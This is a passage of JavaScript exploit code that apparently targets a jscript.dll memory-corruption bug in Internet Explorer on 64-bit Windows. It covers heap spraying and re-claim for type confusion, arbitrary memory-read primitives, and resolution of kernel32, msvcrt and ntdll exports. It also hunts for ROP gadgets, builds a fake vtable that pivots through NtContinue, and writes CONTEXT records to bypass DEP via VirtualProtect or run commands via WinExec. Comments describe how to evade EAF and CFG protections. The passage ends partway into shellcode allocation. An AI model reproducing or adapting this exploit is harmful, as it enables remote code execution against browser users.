    ReClaimNameList(0, CreateVar64(0x8, Address.low + 2, Address.high, 0, 0));
    var LowLow = ((MutableVar.length &gt;&gt; 15) &amp; 0xff) + (((MutableVar.length &gt;&gt; 23) &amp; 0xff) &lt;&lt; 8);
    ReClaimNameList(0, CreateVar64(0x8, Address.low + 4, Address.high, 0, 0));
    var LowHigh = ((MutableVar.length &gt;&gt; 15) &amp; 0xff) + (((MutableVar.length &gt;&gt; 23) &amp; 0xff) &lt;&lt; 8);
    ReClaimNameList(0, CreateVar64(0x8, Address.low + 6, Address.high, 0, 0));
    var HighLow = ((MutableVar.length &gt;&gt; 15) &amp; 0xff) + (((MutableVar.length &gt;&gt; 23) &amp; 0xff) &lt;&lt; 8);
    ReClaimNameList(0, CreateVar64(0x8, Address.low + 8, Address.high, 0, 0));
    var HighHigh = ((MutableVar.length &gt;&gt; 15) &amp; 0xff) + (((MutableVar.length &gt;&gt; 23) &amp; 0xff) &lt;&lt; 8);
    return MakeQword(HighLow + (HighHigh &lt;&lt; 16), LowLow + (LowHigh &lt;&lt; 16));
}

function LeakObjectAddress64(ObjVarAddress, ObjVarValue) { // This function does not always work, there are some edge cases. For example if a BSTR is declared var A = "123"; it works fine. However, var A = "1"; A += "23"; resuls in multiple layers of VARs referencing VARs and this function will no longer get the actual BSTR address.
    ReClaimNameList(ObjVarValue, CreateVar64(0x8, ObjVarAddress.low + 8 + 2, ObjVarAddress.high, 0, 0));
    var LowLow = ((MutableVar.length &gt;&gt; 15) &amp; 0xff) + (((MutableVar.length &gt;&gt; 23) &amp; 0xff) &lt;&lt; 8);
    ReClaimNameList(ObjVarValue, CreateVar64(0x8, ObjVarAddress.low + 8 + 4, ObjVarAddress.high, 0, 0));
    var LowHigh = ((MutableVar.length &gt;&gt; 15) &amp; 0xff) + (((MutableVar.length &gt;&gt; 23) &amp; 0xff) &lt;&lt; 8);
    ReClaimNameList(ObjVarValue, CreateVar64(0x8, ObjVarAddress.low + 8 + 6, ObjVarAddress.high, 0, 0));
    var HighLow = ((MutableVar.length &gt;&gt; 15) &amp; 0xff) + (((MutableVar.length &gt;&gt; 23) &amp; 0xff) &lt;&lt; 8);
    ReClaimNameList(ObjVarValue, CreateVar64(0x8, ObjVarAddress.low + 8 + 8, ObjVarAddress.high, 0, 0));
    var HighHigh = ((MutableVar.length &gt;&gt; 15) &amp; 0xff) + (((MutableVar.length &gt;&gt; 23) &amp; 0xff) &lt;&lt; 8);
    var DerefObjVarAddress = MakeQword(HighLow + (HighHigh &lt;&lt; 16), LowLow + (LowHigh &lt;&lt; 16) + 8);
    return LeakQword64(DerefObjVarAddress); // The concept here is to turn the property name (the mutable var) into a BSTR VAR pointing at its own VVAL (which starts with another, real VAR). The real VAR can be set dynamically to the address of the desired object. So there are two stages: first to read the object pointer out of the VAR within the final VVAL, and then to leak the object pointer of the VAR it is pointing to (skipping +8 over its Type field)
}

////////
////////
// PE parsing/EAT and IAT resolution code
////////

function ResolveExport64(ModuleBase, TargetExportNameTable) {
    var FileHdrRva = LeakDword64(MakeQword(ModuleBase.high, ModuleBase.low + 0x3c));
    var EATRva = LeakDword64(MakeQword(ModuleBase.high, ModuleBase.low + FileHdrRva + 0x88));
    
    if(EATRva) {
        var TotalExports = LeakDword64(MakeQword(ModuleBase.high, ModuleBase.low + EATRva + 0x14));
        var AddressRvas = LeakDword64(MakeQword(ModuleBase.high, ModuleBase.low + EATRva + 0x1C));
        var NameRvas = LeakDword64(MakeQword(ModuleBase.high, ModuleBase.low + EATRva + 0x20));
        var OrdinalRvas = LeakDword64(MakeQword(ModuleBase.high, ModuleBase.low + EATRva + 0x24));
        var MaxIndex = TotalExports;
        var MinIndex = 0;
        var CurrentIndex = Math.floor(TotalExports / 2);
        var TargetTableIndex = 0;
        var BinRes = 0;
        var TrailingNullWord = false;
        
        if((TargetExportNameTable[TargetExportNameTable.length - 1] &amp; 0xFFFFFF00) == 0) {
            TrailingNullWord = true;
        }
        
        while(TotalExports) { 
            var CurrentNameRva = LeakDword64(MakeQword(ModuleBase.high, ModuleBase.low + NameRvas + 4*CurrentIndex));

            while (TargetTableIndex &lt; TargetExportNameTable.length) {
                var CurrentNameWord = LeakWord64(MakeQword(ModuleBase.high, ModuleBase.low + (CurrentNameRva + (4 * TargetTableIndex))));
                var TargetExportNameWord = (TargetExportNameTable[TargetTableIndex] &amp; 0x0000FFFF);
                var SanitizedCurrentNameWord = NullSanitizeWord(CurrentNameWord);
                var FinalTableIndex = false;
                
                if((TargetTableIndex + 1) &gt;= TargetExportNameTable.length) {
                    FinalTableIndex = true;
                }
                
                BinRes = BinaryCmp(TargetExportNameWord, SanitizedCurrentNameWord);

                if(!BinRes) {
                    TargetExportNameWord = ((TargetExportNameTable[TargetTableIndex] &amp; 0xFFFF0000) &gt;&gt; 16);
                    CurrentNameWord = LeakWord64(MakeQword(ModuleBase.high, ModuleBase.low + (CurrentNameRva + (4 * TargetTableIndex)) + 2));
                    SanitizedCurrentNameWord = NullSanitizeWord(CurrentNameWord);

                    if(TrailingNullWord &amp;&amp; FinalTableIndex) {
                        var Ordinal = LeakWord64(MakeQword(ModuleBase.high, ModuleBase.low + OrdinalRvas + 2*CurrentIndex));
                        var MainExport = MakeQword(ModuleBase.high, ModuleBase.low + LeakDword64(MakeQword(ModuleBase.high, ModuleBase.low + AddressRvas + 4*Ordinal)));
                        return MainExport;
                    }
                        
                    BinRes = BinaryCmp(TargetExportNameWord, SanitizedCurrentNameWord);

                    if(!BinRes) {
                        if(FinalTableIndex) {
                            var Ordinal = LeakWord64(MakeQword(ModuleBase.high, ModuleBase.low + OrdinalRvas + 2*CurrentIndex));
                            var MainExport = MakeQword(ModuleBase.high, ModuleBase.low + LeakDword64(MakeQword(ModuleBase.high, ModuleBase.low + AddressRvas + 4*Ordinal)));
                            return MainExport;
                        }
                        
                        TargetTableIndex++;
                    }
                    else {
                        TargetTableIndex = 0;
                        break;
                    }
                }
                else {
                    TargetTableIndex = 0;
                    break;
                }
            }
            
            if(BinRes == 1) { // Target is greater than what it was compared to: reduce current index
                if(MaxIndex == CurrentIndex) {
                    DebugLog("Failed to find export: index hit max");
                    break;
                }
                
                MaxIndex = CurrentIndex;
                CurrentIndex = Math.floor((CurrentIndex + MinIndex) / 2);
            } 
            else if (BinRes == -1) { // Target is less than what it was compared to: enhance current index
                if(MinIndex == CurrentIndex) {
                    DebugLog("Failed to find export: index hit min");
                    break;
                }
                
                MinIndex = CurrentIndex;
                CurrentIndex = Math.floor((CurrentIndex + MaxIndex) / 2);
            }
            
            if(CurrentIndex == MaxIndex &amp;&amp; CurrentIndex == MinIndex) {
                DebugLog("Failed to find export: current, min and max indexes are all equal");
                break;
            }
        }
    }
    
    return MakeQword(0, 0);
}

function SelectRandomImport64(ModuleBase, TargetModuleNameTable) { // Grab the first IAT entry of a function within the specified module
    var ExtractedAddresss = MakeQword(0, 0);
    var FileHdrRva = LeakDword64(MakeQword(ModuleBase.high, ModuleBase.low + 0x3c));
    var ImportDataDirAddress = MakeQword(ModuleBase.high, ModuleBase.low + FileHdrRva + 0x90); // Import data directory
    var ImportRva = LeakDword64(ImportDataDirAddress);
    var ImportSize = LeakDword64(MakeQword(ImportDataDirAddress.high, ImportDataDirAddress.low + 0x4)); // Get the size field of the import data dir
    var DescriptorAddress = MakeQword(ModuleBase.high, ModuleBase.low + ImportRva);
    
    while(ImportSize != 0) {
        var NameRva = LeakDword64(MakeQword(DescriptorAddress.high, DescriptorAddress.low + 0xc)); // 0xc is the offset to the module name pointer
        
        if(NameRva != 0) {
            if(StrcmpLeak64(TargetModuleNameTable, MakeQword(ModuleBase.high, ModuleBase.low + NameRva))) {
                var ThunkRva = LeakDword64(MakeQword(DescriptorAddress.high, DescriptorAddress.low + 0x10));
                ExtractedAddresss = LeakQword64(MakeQword(ModuleBase.high, ModuleBase.low + ThunkRva + 0x18)); // +0x18 (4 thunks forwarded) since __imp___C_specific_handler can cause issues when imported in some jscript instances, and similarly on Windows 10 the 2nd import is ResolveDelayLoadedAPI which is forwarded to NTDLL.DLL.
                break;
            }
            
            ImportSize -= 0x14;
            DescriptorAddress.low += 0x14; // Next import descriptor in array
        }
        else {
            break;
        }
    }
    
    return ExtractedAddresss;
}

function DiveModuleBase64(Address) {
    Address.low = (Address.low &amp; 0xFFFF0000) + 0x4e; // Offset of "This program cannot be run in DOS mode" in PE header.
    
    while(true) {
        if(LeakWord64(Address) == 0x6854) { // 'hT'
            if(LeakWord64(MakeQword(Address.high, Address.low + 2)) == 0x7369) { // 'si'
                return MakeQword(Address.high, Address.low - 0x4e);
            }
        }
        
        Address.low -= 0x10000;
    }
    
    return MakeQword(0, 0);
}

function BaseFromImports64(ModuleBase, TargetModuleNameTable) {
    var RandomImportAddress = SelectRandomImport64(ModuleBase, TargetModuleNameTable);
    
    if(RandomImportAddress.low || RandomImportAddress.high) {
        return DiveModuleBase64(RandomImportAddress);
    }
    
    return MakeQword(0, 0);
}

////////
////////
// Misc. helper functions
////////

function NullSanitizeWord(StrWord) {
    var Sanitized = 0;
    
    if(StrWord != 0) {
        if((StrWord &amp; 0x00FF) == 0) {
            Sanitized = 0; // First byte is NULL, end of the string.
        }
        else {
            Sanitized = StrWord;
        }
    }
    
    return Sanitized;
}

function BinaryCmp(TargetNum, CmpNum) { // return -1 for TargetNum being greater, 0 for equal, 1 for CmpNum being greater
    if(TargetNum == CmpNum) {
        return 0;
    }
    
    while(true) {
        if((TargetNum &amp; 0xff) &gt; (CmpNum &amp; 0xff)) {
            return -1;
        }
        else if((TargetNum &amp; 0xff) &lt; (CmpNum &amp; 0xff)) {
            return 1;
        }
        
        TargetNum = TargetNum &gt;&gt; 8;
        CmpNum = CmpNum &gt;&gt; 8;
    }
}

function DwordToUnicode(Dword) {
    var Unicode = String.fromCharCode(Dword &amp; 0xFFFF);
    Unicode += String.fromCharCode(Dword &gt;&gt; 16);
    return Unicode;
}

function QwordToUnicode(Value) {
    return String.fromCharCode.apply(null, [Value.low &amp; 0xffff, (Value.low &gt;&gt; 16) &amp; 0xffff, Value.high &amp; 0xffff, (Value.high &gt;&gt; 16) &amp; 0xffff]);
}

function TableToUnicode(Table) {
    var Unicode = "";
    
    for(var i = 0; i &lt; Table.length; i++) {
        Unicode += DwordToUnicode(Table[i]);
    }

    return Unicode;
}

function DwordArrayToBytes(DwordArray) {
    var ByteArray = [];
    
    for(var i = 0; i &lt; DwordArray.length; i++) {
        ByteArray.push(DwordArray[i] &amp; 0xffff);
        ByteArray.push((DwordArray[i] &amp; 0xffff0000) &gt;&gt; 16);
    }
    
    return String.fromCharCode.apply(null, ByteArray);
}

function StrcmpLeak64(StrDwordTable, LeakAddress) { // Compare two strings between an array of WORDs and a string at a memory address
    var TargetTableIndex = 0;
    
    while (TargetTableIndex &lt; StrDwordTable.length) {
        var LeakStrWord = LeakWord64(MakeQword(LeakAddress.high, LeakAddress.low + (4 * TargetTableIndex)));
        var SanitizedStrWord = NullSanitizeWord(LeakStrWord);
        var TableWord = (StrDwordTable[TargetTableIndex] &amp; 0x0000FFFF);
        
        if(TableWord == SanitizedStrWord) {
            LeakStrWord = LeakWord64(MakeQword(LeakAddress.high, LeakAddress.low + (4 * TargetTableIndex) + 2));
            SanitizedStrWord = NullSanitizeWord(LeakStrWord);
            TableWord = ((StrDwordTable[TargetTableIndex] &amp; 0xFFFF0000) &gt;&gt; 16);
            
            if(TableWord == SanitizedStrWord) {
                if((TargetTableIndex + 1) &gt;= StrDwordTable.length) {
                    return true;
                }
                
                TargetTableIndex++;
            }
            else {
                break;
            }
        }
        else {
            break;
        }
    }
    
    return false;
}

function MakeDouble(High, Low) {
    return Int52ToDouble(QwordToInt52(High, Low));
}

function QwordToInt52(High, Low) {
    // Sanity check via range. Not all QWORDs are going to be valid  52-bit integers that can be converted to doubles
    
    if ((Low !== Low|0) &amp;&amp; (Low !== (Low|0)+4294967296)) {
        DebugLog ("Low out of range: 0x" + Low.toString(16));
    }
    
    if (High !== High|0 &amp;&amp; High &gt;= 1048576) {
        DebugLog ("High out of range: 0x" + High.toString(16));
    }

    if (Low &lt; 0) {
        Low += 4294967296;
    }

    return High * 4294967296 + Low;
}

function Int52ToDouble(Value) {
    var Low = Value | 0;
    
    if (Low &lt; 0) {
        Low += 4294967296;
    }

    var High = Value - Low;
    
    High /= 4294967296;
    
    if ((High &lt; 0) || (High &gt;= 1048576)) {
        DebugLog("Fatal error - not an int52: 0x" + Value.toString(16));
        Loew = 0;
        High = 0;
    }
    
    return { low: Low, high: High };
}

function MakeQword(High, Low) {
    return { low: Low, high: High };
}

////////
////////
// Dynamic ROP chain creation code
////////

function HarvestGadget64(HintExportAddress, MaxDelta, Data, DataMask, MagicOffset) {
    var MaxHighAddress = MakeQword(HintExportAddress.high, (HintExportAddress.low + MagicOffset + MaxDelta));
    var MinLowAddress = MakeQword(HintExportAddress.high, ((HintExportAddress.low + MagicOffset) - MaxDelta));
    var LeakAddress = MakeQword(HintExportAddress.high, HintExportAddress.low + MagicOffset);
    var LeakFunc = LeakDword64; // Leaking by DWORD causes some quirks on 64-bit. Bitwise NOT solves issue.
    var InitialAddress = LeakAddress;
    var IndexDelta;
    
    if(MinLowAddress.low &lt; HintExportAddress.low) {
        MinLowAddress.low = HintExportAddress.low; // Don't bother scanning below the hint export
    }
    
    DebugLog("Hunting for gadget 0x" + Data.toString(16) + " between 0x" + MinLowAddress.high.toString(16) + MinLowAddress.low.toString(16) + " and 0x" + MaxHighAddress.high.toString(16) + MaxHighAddress.low.toString(16) + " starting from 0x" + LeakAddress.high.toString(16) + LeakAddress.low.toString(16) + " based on hint export at 0x" + HintExportAddress.high.toString(16) + HintExportAddress.low.toString(16));
    
    if(DataMask == 0x0000FFFF) {
        LeakFunc = LeakWord64;
    }
    
    var LeakedData = LeakFunc(LeakAddress);

    if((~LeakedData &amp; DataMask) == ~Data) {
        DebugLog("Found gadget at expected delta of " + MagicOffset.toString(16));
    }
    else {
        var HighAddress = MakeQword(LeakAddress.high, LeakAddress.low + 1);
        var LowAddress = MakeQword(LeakAddress.high, LeakAddress.low - 1);

        LeakAddress = MakeQword(0, 0);

        while(LowAddress.low &gt;= MinLowAddress.low || HighAddress.low &lt; MaxHighAddress.low) {
            if(LowAddress.low &gt;= MinLowAddress.low) {
                LeakedData = LeakFunc(LowAddress);
                
                if((~LeakedData &amp; DataMask) == ~Data) {
                    DebugLog("Found gadget from scan below magic at 0x" + LowAddress.high.toString(16) + LowAddress.low.toString(16));
                    LeakAddress = LowAddress;
                    break;
                }
                
                LowAddress.low -= 1;
            }
            
            if(HighAddress.low &lt; MaxHighAddress.low) {
                LeakedData = LeakFunc(HighAddress);
                
                if((~LeakedData &amp; DataMask) == ~Data) {
                    LeakAddress = HighAddress;
                    IndexDelta = (LeakAddress.low - InitialAddress.low);
                    DebugLog("Found gadget from scan above magic at 0x" + HighAddress.high.toString(16) + HighAddress.low.toString(16) + " (index " + IndexDelta.toString(10) + ")");
                    break;
                }
                
                HighAddress.low += 1;
            }
        }
    }
    
    return LeakAddress;
}

////////
////////
// Primary high level exploit logic
////////

function MakeContextDEPBypass64(NewRSP, ArtificialStackAddress, StackPivotAddress, VirtualProtectAddress, ShellcodeAddress, ShellcodeSize, WritableAddress) {
    return "\u0000\u0000\u0000\u0000" + // P3Home
    "\u0000\u0000\u0000\u0000" + // P4Home
    "\u0000\u0000\u0000\u0000" + // P5Home
    "\u0000\u0000\u0000\u0000" + // P6Home
    "\u0003\u0010" + // ContextFlags
    "\u0000\u0000" + // MxCsr
    "\u0033" + // SegCs
    "\u0000" + // SegDs
    "\u0000" + // SegEs
    "\u0000" + // SegFs
    "\u0000" + // SegGs
    "\u002b" + // SegSs
    "\u0246\u0000" + // EFlags
    "\u0000\u0000\u0000\u0000" + // Dr0 - Prevents EAF too!
    "\u0000\u0000\u0000\u0000" + // Dr1
    "\u0000\u0000\u0000\u0000" + // Dr2
    "\u0000\u0000\u0000\u0000" + // Dr3
    "\u0000\u0000\u0000\u0000" + // Dr6
    "\u0000\u0000\u0000\u0000" + // Dr7
    "\u0000\u0000\u0000\u0000" + // Rax
    QwordToUnicode(ShellcodeAddress) + // Rcx
    QwordToUnicode(ShellcodeSize) + // Rdx
    "\u0000\u0000\u0000\u0000" + // Rbx
    QwordToUnicode(NewRSP) + // Rsp
    "\u0000\u0000\u0000\u0000" + // Rbp
    "\u0000\u0000\u0000\u0000" + // Rsi
    "\u0000\u0000\u0000\u0000" + // Rdi
    "\u0040\u0000\u0000\u0000" + // R8
    QwordToUnicode(WritableAddress) + // R9
    "\u0000\u0000\u0000\u0000" + // R10
    QwordToUnicode(ArtificialStackAddress) + // R11
    "\u0000\u0000\u0000\u0000" + // R12
    "\u0000\u0000\u0000\u0000" + // R13
    "\u0000\u0000\u0000\u0000" + // R14
    "\u0000\u0000\u0000\u0000" + // R15
    QwordToUnicode(StackPivotAddress); // RIP
}

function MakeContextWinExec64(CommandLineAddress, StackPtr, WinExecAddress) {
    return "\u0000\u0000\u0000\u0000" + // P3Home
    "\u0000\u0000\u0000\u0000" + // P4Home
    "\u0000\u0000\u0000\u0000" + // P5Home
    "\u0000\u0000\u0000\u0000" + // P6Home
    "\u0003\u0010" + // ContextFlags
    "\u0000\u0000" + // MxCsr
    "\u0033" + // SegCs
    "\u0000" + // SegDs
    "\u0000" + // SegEs
    "\u0000" + // SegFs
    "\u0000" + // SegGs
    "\u002b" + // SegSs
    "\u0246\u0000" + // EFlags
    "\u0000\u0000\u0000\u0000" + // Dr0 - Prevents EAF too!
    "\u0000\u0000\u0000\u0000" + // Dr1
    "\u0000\u0000\u0000\u0000" + // Dr2
    "\u0000\u0000\u0000\u0000" + // Dr3
    "\u0000\u0000\u0000\u0000" + // Dr6
    "\u0000\u0000\u0000\u0000" + // Dr7
    "\u0000\u0000\u0000\u0000" + // Rax
    QwordToUnicode(CommandLineAddress) + // Rcx - Command pointer
    "\u0005\u0000\u0000\u0000" + // Rdx - SW_SHOW
    "\u0000\u0000\u0000\u0000" + // Rbx
    QwordToUnicode(StackPtr) + // Rsp
    "\u0000\u0000\u0000\u0000" + // Rbp
    "\u0000\u0000\u0000\u0000" + // Rsi
    "\u0000\u0000\u0000\u0000" + // Rdi
    "\u0000\u0000\u0000\u0000" + // R8
    "\u0000\u0000\u0000\u0000" + // R9
    "\u0000\u0000\u0000\u0000" + // R10
    "\u0000\u0000\u0000\u0000" + // R11
    "\u0000\u0000\u0000\u0000" + // R12
    "\u0000\u0000\u0000\u0000" + // R13
    "\u0000\u0000\u0000\u0000" + // R14
    "\u0000\u0000\u0000\u0000" + // R15
    QwordToUnicode(WinExecAddress); // RIP - KERNEL32.DLL!WinExec
}

function CreateFakeVtable(NtContinueAddress) {
    var FakeVtable = "";
    var Padding = [];
    
    for (var i = 0; i &lt; (0x138 / 4); i++) {
        Padding[i] = 0x11111111;
    }
    
    FakeVtable += DwordArrayToBytes(Padding);
    FakeVtable += DwordArrayToBytes([NtContinueAddress.low]);
    FakeVtable += DwordArrayToBytes([NtContinueAddress.high]);
    
    for (var i = (0x140 / 4); i &lt; (0x400 / 4); i++) {
        Padding[i] = 0x22222222;
    }
    
    FakeVtable += DwordArrayToBytes(Padding);
    return FakeVtable;
}

var LFHBlocks = new Array(); // If this is local rather than global the exploit does not work on Windows 8.1 IE11 64-bit
    
function Exploit() {
    if(PayloadType != "shellcode" &amp;&amp; PayloadType != "winexec") {
        DebugLog("Fatal error: invalid payload type");
        return 0;
    }

    // Initialization: these anchor re-claim counts have varying affects on exploit stability. The higher the anchor count, the more stable, but the more time the exploit will take.
    
    if(WindowsVersion &lt;= 7) {
        ReClaimNameList = ReClaimIndexNameList;
        NameListAnchorCount = 5000; // 20000 was needed prior to using GC at the start of the exploit. Performance went from around 4 seconds to 700ms when moved to 400. 5000 was the sweet spot on Win7 IE8 64-bit between speed and stability.
    }
    else {
        ReClaimNameList = ReClaimBackupNameLists;
        
        if(PacFile) {
            NameListAnchorCount = 10000;
        }
        else {
            NameListAnchorCount = 400; // The larger this number the more reliable the exploit on Windows 8.1 where LFH cannot easily re-claim
        }
    }
    
    CollectGarbage(); // This GC is essential for re-claims with randomized LFH on precise regions (such as VVAL re-claim), but it also allows for the GcBlock re-claim count to be drastically reduced (otherwise 20000+ was needed, as in the original exploit)
    
    // Trigger LFH for a size of 0x970

    for(var i = 0; i &lt; 50; i++) { // Only 50 are needed to activate LFH, but spraying additional allocations seems to help clog existing free memory regions on the heap and improve LFH re-claim reliability on Win8.1+
        Temp = new Object();
        Temp[Array(570).join('A')] = 1; // Property name size of 0x239 (569 chars with a default +1 added as a terminator) will produce the desired re-claim allocation size.
        LFHBlocks.push(Temp);
    }
    
    // Re-claim with type confusion NameLists
    
    NewUntrackedVarSet();
    DebugLog("Total untracked variables: " + UntrackedVarSet.length.toString(10));
    
    for(var i = 0; i &lt; NameListAnchorCount; i++) {
        NameListAnchors[i][SizerPropName] = 1; // 0x239 property name size for 0x970 NameList allocation size
        NameListAnchors[i]["BBBBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
        NameListAnchors[i]["\u0005"] = 1; // This ends up in the VVAL hash/name length to be type confused with an integer VAR
        NameListAnchors[i]["C"] = i; // The address of this VVAL will be leaked
    }
    
    AnchorObjectsBackup = NameListAnchors; // Backup name list anchor objects (this will allow re-claim to "stick").
    
    // Leak final VVAL address from one of the NameLists
    
    var LeakedVvalAddress = 0;
    var TypeConfusionAligned = false;
    
    for(var i = 0; i &lt; UntrackedVarSet.length; i++) {
        if(typeof UntrackedVarSet[i] === "number" &amp;&amp; UntrackedVarSet[i] % 1 != 0) {
            LeakedVvalAddress = (UntrackedVarSet[i] / 4.9406564584124654E-324); // This division just converts the float into an easy-to-read 32-bit number
            TypeConfusionAligned = true;
            break;
        }
    }
    
    if(!TypeConfusionAligned) {
        DebugLog("Leaked anchor object type confusion re-claim failed: no untracked var aligned with type confusion float/next VVAL pointer");
        return 0;
    }
    
    LeakedVvalAddress = Int52ToDouble(LeakedVvalAddress); // In Windows 7, the leaked heap pointer could always be encoded in 32-bits. On Windows 8.1 IE11, it often consumes more. By leaking the final VVAL pointer with a double float we can get the bits we need. Experimenting with this I learned all JS numbers are 52 bits in size. In the event that the leaked pointer has its highest bits set it may be an invalid double. This hasn't be an issue on Windows 7 x64, x86, or Windows 8.1 x64 during my testing.
    
    if(!LeakedVvalAddress.high &amp;&amp; !LeakedVvalAddress.low) {
        DebugLog("Leaked anchor object type confusion re-claim failed: conversion of leaked VVAL address (type confusion successful) to double failed (invalid 52-bit integer)");
        return 0;
    }
    
    // Re-claim with VAR-referencing-VAR NameLists
    
    var PrimaryVvalPropName = "AAAAAAAA"; // 16 bytes for size of GcBlock double linked list pointers

    for(var i = 0; i &lt; 46; i++) {
        PrimaryVvalPropName += CreateVar64(0x80, LeakedVvalAddress.low, LeakedVvalAddress.high, 0, 0); // Type 0x80 is a VAR reference
    }
    
    while(PrimaryVvalPropName.length &lt; 0x239) PrimaryVvalPropName += "A";
    
    // Re-claim with leaked VVAL address vars (to be dereferenced for anchor object index extraction)
    
    NewUntrackedVarSet();
    
    for(var i = 0; i &lt; NameListAnchorCount; i++) {
        NameListAnchors[i][PrimaryVvalPropName] = 1;
    }
    
    // Extract NameList anchor index through untracked var dereference to leaked VVAL prefix VAR
    
    var LeakedVvalVar;

    for(var i = 0; i &lt; UntrackedVarSet.length; i++) {
        if(typeof UntrackedVarSet[i] === "number") {
            LeakedAnchorIndex = parseInt(UntrackedVarSet[i] + ""); // Attempting to access the untracked var without parseInt will fail ("null or not an object")
            LeakedVvalVar = UntrackedVarSet[i]; // The + "" trick alone does not seeem to be enough to populate this with the actual value
            break;
        }
    }
    
    DebugLog("Leaked anchor object index: " + LeakedAnchorIndex.toString(16));
    
    // Verify that the VAR within the leaked VVAL can be influenced by directly freeing/re-claiming the NameList associated with the leaked NameList anchor object (whose index is now known)
    
    ReClaimNameList(0x11, "A");
    
    if(LeakedVvalVar + "" != 0x11) {
        DebugLog("Failed to extract final VVAL index via re-claim");
        return 0;
    }

    // Create the mutable variable which will be used throughout the remainder of the exploit and re=claim with VAR-referencing-VAR to it for dereference
    
    ReClaimNameList(0, CreateVar64(0x3, 0x22, 0, 0, 0));
    PrimaryVvalPropName = "AAAAAAAA"; // 2 wide chars (4 bytes) plus the 4 byte BSTR length gives 8 bytes: the size of the two GcBlock linked list pointers. Everything after this point can be fake VARs and a tail padding.

    for(var i = 0; i &lt; 46; i++) {
        PrimaryVvalPropName += CreateVar64(0x80, LeakedVvalAddress.low + 0x40, LeakedVvalAddress.high, 0, 0); // +0x40 is the offset to property name field of 64-bit VVAL struct. Type 0x80 is a VAR reference
    }
    
    while(PrimaryVvalPropName.length &lt; 0x239) PrimaryVvalPropName += "A"; // Dynamically pad the end of the proeprty name to correct length
    
    // Re-claim with leaked VVAL name property address vars (this is the memory address of the mutable variable that will be created)
    
    NewUntrackedVarSet();
    
    for(var i = 0; i &lt; NameListAnchorCount; i++) {
        NameListAnchors[i][PrimaryVvalPropName] = 1;
    }
    
    for(var i = 0; i &lt; UntrackedVarSet.length; i++) {
        if(typeof UntrackedVarSet[i] === "number") {
            if(UntrackedVarSet[i] + "" == 0x22) {
                MutableVar = UntrackedVarSet[i];
                break;
            }
        }
    }
    
    // Verify the mutable var can be changed via simple re-claim
    
    ReClaimNameList(0, CreateVar64(0x3, 0x33, 0, 0, 0));
    
    if(MutableVar + "" != 0x33) {
        DebugLog("Failed to verify mutable variable modification via re-claim");
        return 0;
    }
    
    // Test arbitrary read primitive

    var MutableVarAddress = MakeQword(LeakedVvalAddress.high, LeakedVvalAddress.low + 0x40);
    
    if(LeakByte64(MutableVarAddress) != 0x8) { // Change mutable var to a BSTR pointing at itself.
        DebugLog("Memory leak test failed");
        return 0;
    }
    
    // Derive jscript.dll base from leaked Object vtable
    
    var DissectedObj = new Object();
    var ObjectAddress = LeakObjectAddress64(LeakedVvalAddress, DissectedObj);
    var VtableAddress = LeakQword64(ObjectAddress);
    var JScriptBase = DiveModuleBase64(VtableAddress);
    
    if(!JScriptBase.low &amp;&amp; !JScriptBase.high) {
        DebugLog("Failed to leak JScript.dll base address");
        return 0;
    }
    else {
        DebugLog("Leaked JScript base address: 0x" + JScriptBase.high.toString(16) + JScriptBase.low.toString(16));
    }
    
    // Extract the first Kernel32.dll import from Jscript.dll IAT to dive for its base
    
    var Kernel32Base = BaseFromImports64(JScriptBase, [0x4e52454b, 0x32334c45]);
    
    if(!Kernel32Base.low &amp;&amp; !Kernel32Base.high) {
        DebugLog("Kernel32.dll base resolution via Jscript.dll imports failed.");
        return 0;
    }
    else {
        DebugLog("Leaked KERNEL32.DLL base address: 0x" + Kernel32Base.high.toString(16) + Kernel32Base.low.toString(16));
    }
    
    var VirtualProtectAddress;
    var WinExecAddress;
    
    if(PayloadType == "shellcode") {
        // Resolve APIs for command execution: NTDLL.DLL!NtContinue, KERNEL32.DLL!VirtualProtect
        
        VirtualProtectAddress = ResolveExport64(Kernel32Base, [ 0x74726956, 0x506c6175, 0x65746f72, 0x00007463 ]); // VirtualProtect
        
        if(!VirtualProtectAddress.low &amp;&amp; !VirtualProtectAddress.high) {
            DebugLog("Failed to resolve address of KERNEL32.DLL!VirtualProtect");
            return 0;
        }
        
        DebugLog("Successfully resolved address of VirtualProtect to: 0x" + VirtualProtectAddress.high.toString(16) + VirtualProtectAddress.low.toString(16));
    }
    else if(PayloadType == "winexec") {
        // Resolve APIs for command execution: NTDLL.DLL!NtContinue, KERNEL32.DLL!WinExec
        
        WinExecAddress = ResolveExport64(Kernel32Base, [0x456e6957]);
        
        if(!WinExecAddress.low &amp;&amp; !WinExecAddress.high) {
            DebugLog("Failed to resolve address of KERNEL32.DLL!WinExec");
            return 0;
        }
    }
    
    var MsvcrtBase = BaseFromImports64(JScriptBase, [0x6376736d, 0x642e7472]);

    if(!MsvcrtBase.low &amp;&amp; !MsvcrtBase.high) {
        DebugLog("Msvcrt.dll base resolution via Jscript.dll imports failed.");
        return 0;
    }
    
    var NtdllBase = BaseFromImports64(MsvcrtBase, [0x6c64746e, 0x6c642e6c]);
    
    if(!NtdllBase.low &amp;&amp; !NtdllBase.high) {
        DebugLog("Ntdll.dll base resolution via Msvcrt.dll imports failed.");
        return 0;
    }
    
    var NtContinueAddress = ResolveExport64(NtdllBase, [0x6f43744e, 0x6e69746e]);
    
    if(!NtContinueAddress.low &amp;&amp; !NtContinueAddress.high) {
        DebugLog("Failed to resolve address of NTDLL.DLL!NtContinue");
        return 0;
    }
    
    // Leak an authentic stack pointer to avoid triggering the stack pivot protection built into CFG on Windows 8.1+ within the kernel layer of NTDLL.DLL!NtContinue
                  
    var CSessionAddress = LeakQword64(MakeQword(ObjectAddress.high, ObjectAddress.low + 24)); // Get CSession from offset 24
    var LeakedStackPtr = LeakQword64(MakeQword(CSessionAddress.high, CSessionAddress.low + 80));
    LeakedStackPtr.low += 0x8; // Stack alignment needs to be at a 0x10 boundary prior to CALL
    
    // Construct a fake vtable and fake object for use within mutable var property name
    
    var FakeVtable = CreateFakeVtable(NtContinueAddress);
    FakeVtable = FakeVtable.substr(0, FakeVtable.length);
    var FakeVtableAddress = LeakObjectAddress64(LeakedVvalAddress, FakeVtable);
    var MutableVarAddress = MakeQword(LeakedVvalAddress.high, LeakedVvalAddress.low + 0x40);
    var FakeObjAddress = MakeQword(LeakedVvalAddress.high, LeakedVvalAddress.low + 96);
    var Context;

    if(PayloadType == "shellcode") {
        // Allocate memory for shellcode, API output and an artificial stack
    
        var ShellcodeStr = TableToUnicode(Shellcode);
        var ShellcodeLen = MakeQword(0, (ShellcodeStr.length * 2));
